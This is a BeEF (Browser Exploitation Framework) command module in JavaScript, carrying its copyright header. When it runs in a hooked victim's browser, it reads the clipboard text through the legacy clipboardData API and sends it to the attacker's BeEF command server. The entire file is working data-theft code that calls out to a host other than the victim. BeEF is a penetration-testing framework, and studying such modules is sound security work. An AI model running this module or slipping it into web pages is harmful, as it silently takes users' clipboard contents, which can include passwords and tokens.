//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
		if (clipboardData.getData("Text") !== null) {
			beef.net.send("<%= @command_url %>", <%= @command_id %>, "clipboard="+clipboardData.getData("Text"));
		} else {
			beef.net.send("<%= @command_url %>", <%= @command_id %>, "clipboard=clipboardData.getData is null or not supported.");
		}
});
